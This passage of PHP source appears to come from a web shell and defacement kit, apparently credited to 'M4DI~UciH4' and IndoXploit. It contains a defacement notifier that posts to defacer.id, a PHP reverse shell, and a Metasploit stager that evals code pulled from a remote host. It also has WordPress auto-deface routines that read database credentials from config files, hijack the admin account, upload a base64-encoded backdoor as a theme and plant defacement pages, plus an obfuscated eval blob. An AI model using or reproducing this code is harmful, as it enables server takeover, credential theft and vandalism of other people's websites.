                if(isset($not)){ echo "<td align='center' ><textarea cols='43' rows='10'>";for($i=0;$i<count($not);$i++){echo $not[$i]."\n"; } echo "</textarea></td><tr></table>";}else{echo "<td align='center' ><textarea cols='43' rows='10'></textarea>";}
                }       
        }
if($_GET['do'] == 'defid') {
echo '<center>';
echo '<br>';
echo '<h1><--! Defacer.ID <font color=red>Notifier !--></font></h1>';
echo '<br>';
echo '<form method="post" action="" enctype="multipart/form-data">
<b>Nickname :</b><br>
<input class="inputz" size="40" height="10" type="text" name="hekel" value="M4DI~UciH4">
<br><b>Team Name :</b><br>
<input class="inputz" size="40" height="10" type="text" name="crew" value="No team">
<br><b>List Site :</b><br>
<textarea cols="40" rows="10" placeholder="http://site.com/" name="sites"></textarea>
<br>
<br>
<input  class="inputz" type="submit"  name="go" value="hajarr.!">';
echo '</form>';
echo '</center>';
$site = explode("\r\n", $_POST['sites']);
$go = $_POST['go'];
$hekel = $_POST['hekel'];
$crew = $_POST['crew'];
if($go) {
foreach($site as $sites) {
$zh = $sites;
$form_url = "https://defacer.id/archive/notify";
$data_to_post = array();
$data_to_post['attacker'] = "$hekel";
$data_to_post['team'] = "$crew";
$data_to_post['poc'] = 'SQL Injection';
$data_to_post['url'] = "$zh";
$curl = curl_init();
curl_setopt($curl,CURLOPT_URL, $form_url);
curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13'); SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($curl);
echo $result;
curl_close($curl);
echo "<br>";
}
}
} elseif($_GET['do'] == 'tool') {
error_reporting(0);
function ss($t){if (!get_magic_quotes_gpc()) return trim(urldecode($t));return trim(urldecode(stripslashes($t)));}
$s_my_ip = gethostbyname($_SERVER['HTTP_HOST']);$rsport = "443";$rsportb4 = $rsport;$rstarget4 = $s_my_ip;$s_result = "<br><br><br><center><table><div class='mybox' align='center'><td><h2>Reverse shell ( php )</h2><form method='post' actions='?y=<?php echo $pwd;?>&amp;x='tool'><table class='tabnet'><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' name='rstarget4' value='".$rstarget4."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' name='sqlportb4' value='".$rsportb4."' /></td></tr></table><input type='submit' name='xback_php' class='inputzbut' value='connect' style='width:120px;height:30px;margin:10px 2px 0 2px;' /><input type='hidden' name='d' value='".$pwd."' /></form></td><td><hr color='#4C83AF'><td><td><form method='POST'><table class='tabnet'><h2>Metasploit Connection </h2><tr><td style='width:110px;'>Your IP</td><td><input style='width:100%;' class='inputz' type='text' size='40' name='yip' value='".$my_ip."' /></td></tr><tr><td>Port</td><td><input style='width:100%;' class='inputz' type='text' size='5' name='yport' value='443' /></td></tr></table><input class='inputzbut' type='submit' value='Connect' name='metaConnect' style='width:120px;height:30px;margin:10px 2px 0 2px;'></form></td></div></center></table><br><br />";
echo $s_result;
if($_POST['metaConnect']){$ipaddr = $_POST['yip'];$port = $_POST['yport'];if ($ip == "" && $port == ""){echo "fill in the blanks";}else {if (FALSE !== strpos($ipaddr, ":")) {$ipaddr = "[". $ipaddr ."]";}if (is_callable('stream_socket_client')){$msgsock = stream_socket_client("tcp://{$ipaddr}:{$port}");if (!$msgsock){die();}$msgsock_type = 'stream';}elseif (is_callable('fsockopen')){$msgsock = fsockopen($ipaddr,$port);if (!$msgsock) {die(); }$msgsock_type = 'stream';}elseif (is_callable('socket_create')){$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);$res = socket_connect($msgsock, $ipaddr, $port);if (!$res) {die(); }$msgsock_type = 'socket';}else {die();}switch ($msgsock_type){case 'stream': $len = fread($msgsock, 4); break;case 'socket': $len = socket_read($msgsock, 4); break;}if (!$len) {die();}$a = unpack("Nlen", $len);$len = $a['len'];$buffer = '';while (strlen($buffer) < $len){switch ($msgsock_type) {case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); break;case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));break;}}eval($buffer);echo "[*] Connection Terminated";die();}}
if(isset($_REQUEST['sqlportb4'])) $rsportb4 = ss($_REQUEST['sqlportb4']);
if(isset($_REQUEST['rstarget4'])) $rstarget4 = ss($_REQUEST['rstarget4']);
if ($_POST['xback_php']) {$ip = $rstarget4;$port = $rsportb4;$chunk_size = 1337;$write_a = null;$error_a = null;$shell = '/bin/sh';$daemon = 0;$debug = 0;if(function_exists('pcntl_fork')){$pid = pcntl_fork();
if ($pid == -1) exit(1);if ($pid) exit(0);if (posix_setsid() == -1) exit(1);$daemon = 1;}
umask(0);$sock = fsockopen($ip, $port, $errno, $errstr, 30);if(!$sock) exit(1);
$descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
$process = proc_open($shell, $descriptorspec, $pipes);
if(!is_resource($process)) exit(1);
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while(1){if(feof($sock)) break;if(feof($pipes[1])) break;$read_a = array($sock, $pipes[1], $pipes[2]);$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
if(in_array($sock, $read_a)){$input = fread($sock, $chunk_size);fwrite($pipes[0], $input);}
if(in_array($pipes[1], $read_a)){$input = fread($pipes[1], $chunk_size);fwrite($sock, $input);}
if(in_array($pipes[2], $read_a)){$input = fread($pipes[2], $chunk_size);fwrite($sock, $input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process);$rsres = " ";$s_result .= $rsres;}
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "0x1999";
        $pass = "0x1999";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='#FDF105'>Berhasil Depes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=#FDF105>$user</font><br>";
                        echo "[+] password: <font color=#FDF105>$pass</font><br><br>";
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By M4DI~UciH4' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "indoxploit";
        $pass = "indoxploit";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='#FDF105'>berhasil Deface...</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>";
                    } else {
                    echo "[-] <font color='red'>gagal Deface...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=#FDF105>$user</font><br>";
                    echo "[+] password: <font color=#FDF105>$pass</font><br><br>";
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface V.2</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By M4DI~UciH4' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='hantam!!'>
        </form></center>";
    }
}
if($_GET['do'] == 'cpanel') {
eval(gzinflate(base64_decode('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